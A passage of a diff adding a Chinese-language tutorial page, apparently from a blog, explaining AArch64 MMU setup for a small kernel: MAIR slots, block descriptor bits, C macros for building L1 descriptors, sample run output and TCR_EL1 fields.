+&lt;li&gt;槽 2~7 保持 &lt;code&gt;0x00&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// MAIR_EL1 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Slot 0 [7:0]  = 0xFF  Normal memory, outer and inner write-back, read/write allocate
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Slot 1 [15:8] = 0x00  Device-nGnRnE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Slots 2-7 stay 0x00
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MAIR_VALUE (0xFFULL)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;76-ap读写权限&#34;&gt;&lt;code&gt;[7:6]&lt;/code&gt; AP：读写权限&lt;/h4&gt;
+&lt;p&gt;两位只有四种组合：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;AP&lt;/th&gt;
+&lt;th&gt;EL1&lt;/th&gt;
+&lt;th&gt;EL0&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;00&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;rw&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;rw&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;rw&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;r&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;-&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;11&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;r&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;r&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;本文将使用 &lt;code&gt;00&lt;/code&gt; 允许 EL1 读写。由于 EL0 还不存在所以先完全拒绝。将来加入用户态时，用户页会改成 &lt;code&gt;01&lt;/code&gt; 而内核页继续保持 &lt;code&gt;00&lt;/code&gt;。&lt;/p&gt;
+&lt;h4 id=&#34;10-af访问标志&#34;&gt;&lt;code&gt;[10]&lt;/code&gt; AF：访问标志&lt;/h4&gt;
+&lt;p&gt;作用是标记「这一页或这一块内存是否已经被访问过」：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;AF = 0&lt;/code&gt;：硬件认为这块内存还没被访问过。第一次访问时会触发 Access Flag fault（访问标志异常），交给软件处理&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;AF = 1&lt;/code&gt;：正常访问，不产生异常&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;AF 原本是给操作系统统计页面冷热，从而决定内存不足时把哪些页换出（写入 swap 分区或交换文件）用的。为了保持本项目的简洁，本项目不做页面换出，所以直接把 AF 置 1，以免遇到 Access Flag fault。&lt;/p&gt;
+&lt;h4 id=&#34;4712-output-address翻译结果的物理基址&#34;&gt;&lt;code&gt;[47:12]&lt;/code&gt; Output Address：翻译结果的物理基址&lt;/h4&gt;
+&lt;p&gt;输出地址字段的位置取决于描述符所在的层级。在采用的 4 KB 翻译粒度，48 位物理地址，此时描述符格式如下：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;描述符&lt;/th&gt;
+&lt;th&gt;映射大小&lt;/th&gt;
+&lt;th&gt;物理基址字段&lt;/th&gt;
+&lt;th&gt;对齐要求&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;L1 块描述符&lt;/td&gt;
+&lt;td&gt;1 GB&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;[47:30]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;1 GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;L2 块描述符&lt;/td&gt;
+&lt;td&gt;2 MB&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;[47:21]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;2 MB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;L3 页描述符&lt;/td&gt;
+&lt;td&gt;4 KB&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;[47:12]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;4 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;本文只使用 L1 块描述符，因此描述符的 &lt;code&gt;[47:30]&lt;/code&gt; 保存目标物理块基址的对应位。&lt;/p&gt;
+&lt;h4 id=&#34;53-pxn-与-54-uxn执行权限&#34;&gt;&lt;code&gt;[53]&lt;/code&gt; PXN 与 &lt;code&gt;[54]&lt;/code&gt; UXN：执行权限&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;PXN&lt;/strong&gt;（Privileged Execute-Never）置 1 表示 EL1 不能从这块内存取指执行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;UXN&lt;/strong&gt;（Unprivileged Execute-Never）置 1 表示 EL0 不能从这块内存取指执行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;之前提到过，本项目的第零个描述符指向设备区，由于不是代码所以置 &lt;code&gt;PXN = 1, UXN = 1&lt;/code&gt; 禁止执行。第一个描述符执行内核 RAM 所以可以置 &lt;code&gt;PXN = 0, UXN = 1&lt;/code&gt; 禁止 EL0 执行，允许 EL1 执行。&lt;/p&gt;
+&lt;h4 id=&#34;其余位&#34;&gt;其余位&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;[11]&lt;/code&gt; nG 负责 TLB 全局性，&lt;code&gt;[9:8]&lt;/code&gt; SH 控制内存在多核间的共享域，&lt;code&gt;[5]&lt;/code&gt; NS 控制访问安全还是非安全物理地址空间（仅 Secure 状态有意义）。本项目只有一套页表，并且是单核运行在非安全状态，所以全部置 0 即可。&lt;/p&gt;
+&lt;h4 id=&#34;总结&#34;&gt;总结&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;位段&lt;/th&gt;
+&lt;th&gt;名字&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;本文的值&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[1:0]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;类型&lt;/td&gt;
+&lt;td&gt;L1 时：&lt;code&gt;00&lt;/code&gt; 无效 / &lt;code&gt;01&lt;/code&gt; 块 / &lt;code&gt;11&lt;/code&gt; 表&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[4:2]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;AttrIndx&lt;/td&gt;
+&lt;td&gt;MAIR 槽号 0–7&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt; 或 &lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[7:6]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;AP&lt;/td&gt;
+&lt;td&gt;访问权限&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;00&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[10]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;AF&lt;/td&gt;
+&lt;td&gt;Access Flag&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[47:12]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;地址&lt;/td&gt;
+&lt;td&gt;输出物理基址&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt; / &lt;code&gt;0x4000_0000&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[53]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;PXN&lt;/td&gt;
+&lt;td&gt;EL1 禁止执行&lt;/td&gt;
+&lt;td&gt;设备 &lt;code&gt;1&lt;/code&gt;，RAM &lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[54]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;UXN&lt;/td&gt;
+&lt;td&gt;EL0 禁止执行&lt;/td&gt;
+&lt;td&gt;都是 &lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;其余&lt;/td&gt;
+&lt;td&gt;保留 / nG / SH&lt;/td&gt;
+&lt;td&gt;本手册保持 0&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;从而可以定义以下宏：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_BLOCK     (0b01ULL &amp;lt;&amp;lt; 0) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [1:0] = 01: Block 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_TABLE     (0b11ULL &amp;lt;&amp;lt; 0) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [1:0] = 11: Table / Page
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_ATTR(idx) ((uint64_t)(idx) &amp;lt;&amp;lt; 2)	&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [4:2] MAIR Slot Number
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_AP_EL1_RW (0ULL &amp;lt;&amp;lt; 6)		&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [7:6]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_AF        (1ULL &amp;lt;&amp;lt; 10)   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [10]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_PXN       (1ULL &amp;lt;&amp;lt; 53)   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [53]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_UXN       (1ULL &amp;lt;&amp;lt; 54)   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [54]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DESC_ADDR(pa)  ((uint64_t)(pa) &amp;amp; 0x0000FFFFFFFFF000ULL)  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// [47:12]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define ATTR_NORMAL 0                 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// MAIR 0xFF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define ATTR_DEVICE 1                 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// MAIR 0x00
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;描述符构建&#34;&gt;描述符构建&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l1_table[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DESC_ADDR&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Map 1 GB at 0x0000_0000 as device memory
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;              DESC_BLOCK &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#a6e22e&#34;&gt;DESC_ATTR&lt;/span&gt;(ATTR_DEVICE) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              DESC_AF &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              DESC_PXN &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; DESC_UXN;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l1_table[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DESC_ADDR&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x40000000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Map 1 GB at 0x4000_0000 as RAM
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;              DESC_BLOCK &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#a6e22e&#34;&gt;DESC_ATTR&lt;/span&gt;(ATTR_NORMAL) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              DESC_AF &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              DESC_UXN;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;两条的差别只有三处：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;差别&lt;/th&gt;
+&lt;th&gt;描述符 0&lt;/th&gt;
+&lt;th&gt;描述符 1&lt;/th&gt;
+&lt;th&gt;原因&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;地址&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0x00000_0000&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0x4000_0000&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;区分设备区与 RAM&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;AttrIndx&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;寄存器不能缓存&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PXN&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;内核代码在 RAM 中运行&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;运行&#34;&gt;运行&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到输出：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Current EL: 1
+l1_table addr = 0x0000000040103000
+l1_table[0] = 0x0060000000000405
+l1_table[1] = 0x0040000040000401
+Platform timer frequency: 62500000
+UART and Timer IRQ ready
+tick: 100
+tick: 200
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;第二步明确翻译机制&#34;&gt;第二步：明确翻译机制&lt;/h2&gt;
+&lt;h3 id=&#34;高低半区&#34;&gt;高低半区&lt;/h3&gt;
+&lt;p&gt;虽然 AArch64 的虚拟地址是 64 位，但并不是所有 64 位地址都可用。地址空间被切成两段：&lt;strong&gt;低半区&lt;/strong&gt;从 &lt;code&gt;0x0000_0000_0000_0000&lt;/code&gt; 向上，&lt;strong&gt;高半区&lt;/strong&gt;从 &lt;code&gt;0xFFFF_FFFF_FFFF_FFFF&lt;/code&gt; 向下，中间没有覆盖到的地址是无效的空洞。硬件会检查虚拟地址的高位（位数决定方式在下一章节）：全 0 走低半区，用 &lt;code&gt;TTBR0_EL1&lt;/code&gt;；全 1 走高半区，用 &lt;code&gt;TTBR1_EL1&lt;/code&gt;；既不全 0 也不全 1，就落在空洞里触发翻译错误。&lt;/p&gt;
+&lt;p&gt;这两个寄存器的 [47:12] 是根表的物理基址，[63:48] 是 &lt;strong&gt;ASID（Address Space ID）&lt;/strong&gt;。不同的进程可以拥有相同的 VA，如果 TLB（MMU 内部用来缓存 VA -&amp;gt; PA 翻译结果的表）只按 VA 索引，那么就会拿到另一个进程旧结果，解决方案只有在切换进程时先刷新整个 TLB。有了 ASID，可以理解为非全局映射的 TLB 条目会变成（ASID，VA）-&amp;gt; PA，从而不用在切换进程时刷新整个 TLB。&lt;/p&gt;
+&lt;p&gt;这样分段的好处是：用户空间放低半区，内核空间放高半区，切换进程时只需要修改 &lt;code&gt;TTBR0_EL1&lt;/code&gt;，内核映射（&lt;code&gt;TTBR1_EL1&lt;/code&gt;）保持不变。所以在 Linux 等系统中，内核地址通常以 &lt;code&gt;0xFFFF_...&lt;/code&gt; 开头，用户地址则从很小的数开始。&lt;/p&gt;
+&lt;p&gt;本文为了保持简洁并尽量沿用之前的代码，所以只用低半区：内核链接在 &lt;code&gt;0x4010_0000&lt;/code&gt;，并把 &lt;code&gt;l1_table&lt;/code&gt; 的物理地址写入 &lt;code&gt;TTBR0_EL1&lt;/code&gt;。高半区则直接关闭。&lt;/p&gt;
+&lt;h3 id=&#34;tcr_el1翻译机制的参数&#34;&gt;&lt;code&gt;TCR_EL1&lt;/code&gt;：翻译机制的参数&lt;/h3&gt;
+&lt;p&gt;Translation Control Register（EL1）决定翻译机制本身如何运转，包含以下字段：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;地址空间：&lt;code&gt;T0SZ&lt;/code&gt; / &lt;code&gt;T1SZ&lt;/code&gt; 也就是高低半区&lt;/li&gt;
+&lt;li&gt;粒度：&lt;code&gt;TG0&lt;/code&gt; / &lt;code&gt;TG1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;遍历属性：&lt;code&gt;IRGN0&lt;/code&gt; / &lt;code&gt;ORGN0&lt;/code&gt; / &lt;code&gt;SH0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;PA 宽度： &lt;code&gt;IPS&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;50-t0sz-与-2116-t1sz高低半区虚拟地址位数&#34;&gt;&lt;code&gt;[5:0]&lt;/code&gt; T0SZ 与 &lt;code&gt;[21:16]&lt;/code&gt; T1SZ：高低半区虚拟地址位数&lt;/h4&gt;
+&lt;p&gt;T0SZ 和 T1SZ 决定了低半区和高半区的虚拟地址有多少位。例如低半区（即由 &lt;code&gt;TTBR0_EL1&lt;/code&gt; 管理的那一半）：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;VA 位数 = 64 - T0SZ
+顶层索引位数 = VA 位数 − 12 − 9 * 下面层数
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;T0SZ&lt;/th&gt;
+&lt;th&gt;VA 位数&lt;/th&gt;
+&lt;th&gt;4 KB 粒度下的层级&lt;/th&gt;
+&lt;th&gt;顶层索引位数&lt;/th&gt;
+&lt;th&gt;起始层可用条目&lt;/th&gt;
+&lt;th&gt;可寻址&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;16&lt;/td&gt;
+&lt;td&gt;48&lt;/td&gt;
+&lt;td&gt;L0 -&amp;gt; L1 -&amp;gt; L2 -&amp;gt; L3&lt;/td&gt;
+&lt;td&gt;9&lt;/td&gt;
+&lt;td&gt;512&lt;/td&gt;
+&lt;td&gt;256 TB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;25&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;39&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;L1 -&amp;gt; L2 -&amp;gt; L3&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;512&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;512 GB&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;30&lt;/td&gt;
+&lt;td&gt;34&lt;/td&gt;
+&lt;td&gt;L1 -&amp;gt; L2 -&amp;gt; L3&lt;/td&gt;
+&lt;td&gt;4&lt;/td&gt;
+&lt;td&gt;16&lt;/td&gt;
+&lt;td&gt;16 GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;33&lt;/td&gt;
+&lt;td&gt;31&lt;/td&gt;
+&lt;td&gt;L1 -&amp;gt; L2 -&amp;gt; L3&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;2 GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;本文为了让层级直接从 L1 开始，&lt;code&gt;T0SZ&lt;/code&gt; 必须大于等于 25 且小于等于 33。更小的合法值会从 L0 开始（而 L0 不允许使用块描述符），更大的合法值会从 L2 或 L3 开始。本文选 25 是因为它在这个区间里给出的地址空间最大（512 GB），而页表内存的代价完全相同（都是一张 4 KB 表）。&lt;/p&gt;
+&lt;p&gt;对于 &lt;code&gt;T1SZ&lt;/code&gt;，虽然本文暂时不用高半区，但这里仍然写 &lt;code&gt;25&lt;/code&gt; 保持一个合法值。&lt;/p&gt;
+&lt;h4 id=&#34;7-epd0-与-23-epd1是否禁止通过-ttbr0--ttbr1-遍历&#34;&gt;&lt;code&gt;[7]&lt;/code&gt; EPD0 与 &lt;code&gt;[23]&lt;/code&gt; EPD1：是否禁止通过 TTBR0 / TTBR1 遍历&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0&lt;/code&gt;：允许，正常遍历&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1&lt;/code&gt;：使用对应 TTBR 的访问若发生 TLB miss，会触发 Translation fault，不再进行页表遍历，但已有的 TLB 命中仍可能使用缓存结果&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;对于 EPD0 本文必须置 &lt;code&gt;0&lt;/code&gt;，而高半区因为不使用所以 EPD1 置 &lt;code&gt;1&lt;/code&gt;。&lt;/p&gt;
+&lt;h4 id=&#34;98-irgn0--1110-orgn0-与-2524-irgn1-2726--orgn1页表遍历本身的缓存属性&#34;&gt;&lt;code&gt;[9:8]&lt;/code&gt; IRGN0 / &lt;code&gt;[11:10]&lt;/code&gt; ORGN0 与 &lt;code&gt;[25:24]&lt;/code&gt; IRGN1 &lt;code&gt;[27:26]&lt;/code&gt; / ORGN1：页表遍历本身的缓存属性&lt;/h4&gt;
